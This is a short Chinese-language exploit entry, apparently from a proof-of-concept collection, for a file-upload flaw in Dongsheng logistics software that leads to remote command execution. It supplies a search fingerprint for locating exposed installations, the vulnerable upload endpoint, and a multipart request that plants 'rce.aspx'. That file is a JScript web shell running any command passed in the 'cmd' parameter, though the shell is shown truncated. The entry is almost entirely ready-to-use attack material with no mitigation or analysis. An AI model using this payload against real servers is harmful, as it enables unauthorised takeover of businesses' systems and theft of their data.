# 东胜物流软件Upload存在文件上传致RCE漏洞

- **系统**：东胜物流软件　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="东胜物流软件-物流软件"`
- **请求**：`POST /SoftMng/FileInputHandler/Upload HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lC…`

**请求体 / payload**
```
------WebKitFormBoundaryaKljzbg49Mq4ggLz
Content-Disposition: form-data; name="file"; filename="rce.aspx"
Content-Type: application/octet-stream
<%@ Page Language="Jscript" validateRequest="false" %><%var c=new System.Diagnostics.ProcessStartInfo("cmd");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c " + Request.Item["cmd"];e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write(out.ReadToEnd() + EI.ReadToEnd());Syst…（脚本共 700 字，完整版见原文）
```
- **预期**：200　|　—